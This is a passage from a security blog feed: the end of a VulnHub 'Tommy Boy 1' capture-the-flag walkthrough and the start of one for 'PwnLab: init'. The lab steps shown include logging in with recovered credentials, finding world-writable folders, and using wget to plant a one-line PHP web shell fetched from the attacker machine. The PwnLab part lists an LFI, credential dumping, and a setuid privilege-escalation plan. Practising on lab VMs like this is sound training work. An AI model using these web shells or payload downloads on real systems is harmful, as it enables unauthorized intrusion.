<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# cat passwords.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Sandusky Banking Site&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Username: BigTommyC
</span><span class='line'>Password: money&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;TheKnot.com <span class="o">(</span>wedding site<span class="o">)</span>&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Username: TomC
</span><span class='line'>Password: wedding&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Callahan Auto Server&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Username: bigtommysenior
</span><span class='line'>Password: fatguyinalittlecoat&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Note: after the <span class="p">&amp;</span>ldquo<span class="p">;</span>fatguyinalittlecoat<span class="p">&amp;</span>rdquo<span class="p">;</span> part there are some numbers, but I don<span class="p">&amp;</span>rsquo<span class="p">;</span>t remember what they are.
</span><span class='line'>However, I wrote myself a draft on the company blog with that information.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Callahan Company Blog&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Username: bigtom<span class="o">(</span>I think?<span class="o">)</span>
</span><span class='line'>Password: ???
</span><span class='line'>Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
</span></code></pre></td></tr></table></div></figure></p>

<p>After login to the blog as Big Tom by using the password found previously in <code>wpscan</code> stage, I noticed that there is a draft post:</p>

<p><img class="left" src="/downloads/tommyboy1/11.png"></p>

<p>Now I got the Server SSH login password:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;Callahan Auto Server&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Username: bigtommysenior
</span><span class='line'>Password: fatguyinalittlecoat1938!!
</span></code></pre></td></tr></table></div></figure></p>

<p>Login to SSH as Big Tom:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#98;&amp;#x69;&amp;#103;&amp;#116;&amp;#111;&amp;#x6d;&amp;#109;&amp;#x79;&amp;#115;&amp;#x65;&amp;#x6e;&amp;#105;&amp;#x6f;&amp;#x72;&amp;#x40;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#x34;&amp;#x31;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#98;&amp;#x69;&amp;#103;&amp;#x74;&amp;#111;&amp;#x6d;&amp;#109;&amp;#121;&amp;#x73;&amp;#101;&amp;#110;&amp;#x69;&amp;#111;&amp;#x72;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#52;&amp;#x31;&lt;/a&gt;</span>
</span><span class='line'>The authenticity of host <span class="p">&amp;</span>lsquo<span class="p">;</span>10.1.1.141 <span class="o">(</span>10.1.1.141<span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> can<span class="p">&amp;</span>rsquo<span class="p">;</span>t be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:bI4/w4tR6j1XRyuLkIs5icsyLJM0Kfw9m4iPFpXX0NI.
</span><span class='line'>Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no<span class="o">)</span>? yes
</span><span class='line'>Warning: Permanently added <span class="p">&amp;</span>lsquo<span class="p">;</span>10.1.1.141<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#98;&amp;#105;&amp;#x67;&amp;#x74;&amp;#x6f;&amp;#x6d;&amp;#x6d;&amp;#x79;&amp;#x73;&amp;#x65;&amp;#110;&amp;#105;&amp;#111;&amp;#x72;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x34;&amp;#49;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x62;&amp;#105;&amp;#x67;&amp;#116;&amp;#x6f;&amp;#x6d;&amp;#x6d;&amp;#x79;&amp;#115;&amp;#101;&amp;#x6e;&amp;#x69;&amp;#x6f;&amp;#114;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#46;&amp;#x31;&amp;#x34;&amp;#x31;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Welcome to Ubuntu 16.04 LTS <span class="o">(</span>GNU/Linux 4.4.0-36-generic x86_64<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;112 packages can be updated.
</span><span class='line'><span class="m">0</span> updates are security updates.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Last login: Thu Jul <span class="m">14</span> 13:45:57 2016
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>uname -a
</span><span class='line'>Linux CallahanAutoSrv01 4.4.0-36-generic <span class="c">#55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/bigtommysenior
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls -la
</span><span class='line'>total 40
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">4</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">8</span> 08:57 .
</span><span class='line'>drwxr-xr-x <span class="m">5</span> root           root           <span class="m">4096</span> Jul  <span class="m">7</span> 00:17 ..
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> bigtommysenior bigtommysenior    <span class="m">0</span> Jul <span class="m">21</span> 17:47 .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">220</span> Jul  <span class="m">7</span> 00:12 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior <span class="m">3771</span> Jul  <span class="m">7</span> 00:12 .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">7</span> 00:16 .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">307</span> Jul  <span class="m">7</span> 14:18 callahanbak.bak
</span><span class='line'>-rw-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">237</span> Jul  <span class="m">7</span> 15:27 el-flag-numero-quatro.txt
</span><span class='line'>-rw-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">630</span> Jul  <span class="m">7</span> 17:59 LOOT.ZIP
</span><span class='line'>drwxrwxr-x <span class="m">2</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">7</span> 13:50 .nano
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">675</span> Jul  <span class="m">7</span> 00:12 .profile
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior    <span class="m">0</span> Jul  <span class="m">7</span> 00:17 .sudo_as_admin_successful
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<h3>The 4th Flag</h3>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat el-flag-numero-quatro.txt
</span><span class='line'>YAY!  Flag <span class="m">4</span> out of 5!!!! And you should now be able to restore the Callhan Web server to normal
</span><span class='line'>working status.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Flag data: EditButton&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;But<span class="p">&amp;</span>hellip<span class="p">;</span>but<span class="p">&amp;</span>hellip<span class="p">;</span>where<span class="p">&amp;</span>rsquo<span class="p">;</span>s flag 5?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I<span class="p">&amp;</span>rsquo<span class="p">;</span>ll make it easy on you.  It<span class="p">&amp;</span>rsquo<span class="p">;</span>s in the root of this server at /5.txt
</span></code></pre></td></tr></table></div></figure></p>

<p>Then doing the restoring the web site from backup, I got he server back online again:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cp callahanbak.bak /var/www/html/index.html
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls -l /var/www/html/index.html
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior <span class="m">307</span> Sep  <span class="m">5</span> 07:16 /var/www/html/index.html
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat /var/www/html/index.html
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;title&gt;Welcome to Callahan Auto&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;H1&gt;&lt;center&gt;Welcome to Callahan Auto!&lt;/center&gt;&lt;/H1&gt;
</span><span class='line'>&lt;font <span class="nv">color</span><span class="o">=</span><span class="s2">&quot;0000ff&quot;</span>&gt;&lt;H2&gt;&lt;center&gt;SYSTEM STATUS: ONLINE&lt;/center&gt;&lt;/H2&gt;&lt;/font&gt;
</span><span class='line'>&lt;H3&gt;We<span class="p">&amp;</span>rsquo<span class="p">;</span>re happy to be serving all your brakepad needs.&lt;/H3&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;center&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;ca.jpeg&quot;</span>&gt;&lt;/center&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>&lt;!----&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/tommyboy1/12.png"></p>

<p>By doing enumeration and found the following world-writable folders:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/www/html<span class="nv">$ </span>find / -perm -222 -type d 2&gt;/dev/null
</span><span class='line'>/var/lib/php/sessions
</span><span class='line'>/var/crash
</span><span class='line'>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads
</span><span class='line'>/var/tmp
</span><span class='line'>/dev/mqueue
</span><span class='line'>/dev/shm
</span><span class='line'>/run/lock
</span><span class='line'>/tmp
</span><span class='line'>/tmp/.XIM-unix
</span><span class='line'>/tmp/.Test-unix
</span><span class='line'>/tmp/.font-unix
</span><span class='line'>/tmp/.ICE-unix
</span><span class='line'>/tmp/.X11-unix
</span></code></pre></td></tr></table></div></figure></p>

<p>Now upload single-line php shell to the writable folder <font color="red"><code>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads</code></font> and name it to <code>sh.php</code></p>

<p>The PHP shell:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html# cat shell.php
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>cmd<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Upload it to target:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads<span class="nv">$ </span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.132/shell.php&quot;</span>&gt;http://10.1.1.132/shell.php&lt;/a&gt; -O sh.php
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-09-05 07:38:35<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.132/shell.php&quot;</span>&gt;http://10.1.1.132/shell.php&lt;/a&gt;
</span><span class='line'>Connecting to 10.1.1.132:80<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">200</span> OK
</span><span class='line'>Length: 31
</span><span class='line'>Saving to: ‘sh.php’&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;sh.php                                              100%<span class="o">[================================================================================================================</span>&gt;<span class="o">]</span>      <span class="m">31</span>  <span class="p">&amp;</span>ndash<span class="p">;</span>.-KB/s    in 0s&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2016-09-05 07:38:35 <span class="o">(</span>6.03 MB/s<span class="o">)</span> - ‘sh.php’ saved <span class="o">[</span>31/31<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads<span class="nv">$ </span>ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxrwxrwx <span class="m">2</span> www-data       www-data       <span class="m">4096</span> Sep  <span class="m">5</span> 07:38 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> www-data       www-data       <span class="m">4096</span> Jul <span class="m">15</span> 12:47 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root           root            <span class="m">243</span> Jul <span class="m">15</span> 12:23 .htaccess
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root           root            <span class="m">447</span> Jul <span class="m">15</span> 12:32 index.html
</span><span class='line'>-rw-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> bigtommysenior bigtommysenior   <span class="m">31</span> Aug <span class="m">24</span> 06:43 sh.php
</span></code></pre></td></tr></table></div></figure></p>

<h3>The 5th Flag</h3>

<p>Found the 5th flag file:</p>

<p><img class="left" src="/downloads/tommyboy1/13.png"></p>

<p>The 5th flag is <font color="red">Buttcrack</font></p>

<p>Ok now blob all the flag together to make the password: <font color="red"><code>B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack</code></font></p>

<p>Great, now to open the <code>LOOT.ZIP</code> file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>unzip LOOT.ZIP
</span><span class='line'>Archive:  LOOT.ZIP
</span><span class='line'><span class="o">[</span>LOOT.ZIP<span class="o">]</span> THE-END.txt password:
</span><span class='line'>  inflating: THE-END.txt           &lt;br/&gt;
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls
</span><span class='line'>callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP  THE-END.txt
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat THE-END.txt
</span><span class='line'>YOU CAME.
</span><span class='line'>YOU SAW.
</span><span class='line'>YOU PWNED.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;GREAT WORK!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I<span class="p">&amp;</span>rsquo<span class="p">;</span>d love to know that you finished this VM, and/or get your suggestions on how to make the next
</span><span class='line'>one better.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Please shoot me a note at 7ms @ 7ms.us with subject line <span class="p">&amp;</span>ldquo<span class="p">;</span>Here comes the meat wagon!<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Or, get in touch with me other ways:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Twitter: @7MinSec&lt;/li&gt;
</span><span class='line'>&lt;li&gt;IRC <span class="o">(</span>Freenode<span class="o">)</span>: <span class="c">#vulnhub (username is braimee)&lt;/li&gt;</span>
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Lastly, please don<span class="p">&amp;</span>rsquo<span class="p">;</span>t forget to check out www.7ms.us and subscribe to the podcast at
</span><span class='line'>bit.ly/7minsec&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/shamelessplugs&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thanks and have a blessed week!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;-Brian Johnson
</span><span class='line'><span class="m">7</span> Minute Security
</span></code></pre></td></tr></table></div></figure></p>

<p>Hooooo, finally, Got it!!</p>

<p><!--- Reference --></p>

<p>[1]: <a href="http://www.liatsisfotis.com/2013/02/create-wordlists-using-crunch.html">http://www.liatsisfotis.com/2013/02/create-wordlists-using-crunch.html</a>             &ldquo;Create wordlists using crunch&rdquo;
[2]: <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a>                        &ldquo;PHP Reverse Shell by pentestmonkey&rdquo;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] PwnLab: init]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init/"/>
    <updated>2016-08-29T06:46:38-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init</id>
    <content type="html"><![CDATA[<p>&ldquo;Wellcome to \"PwnLab: init\&rdquo;, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/claor,331/">Claor</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: PwnLab: init (<em>10.1.1.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Inclusion vulnerability</li>
<li>Dump DB tables and crack user credentials</li>
<li>Login and upload webshell/Reverse PHP Shell</li>
<li>Bypass File Extension limit</li>
<li>Exploit <code>setuid</code> sticky bit set file/program to privilege escape</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Local File Inclusion vulnerability found and exploited to discover MySQL login information</li>
<li>Login to MySQL DB and download user table to obtain user/pass</li>
<li>Login to Web application as privilege user and upload webshell/PHP reverse shell</li>
<li>Enumeration after get into the target server and escape to different users</li>
<li>Exploit <code>setuid</code> stikcy bit set program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.140  00:0c:29:11:ce:27   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:ee:0a:4f   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.312 seconds <span class="o">(</span>110.73 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
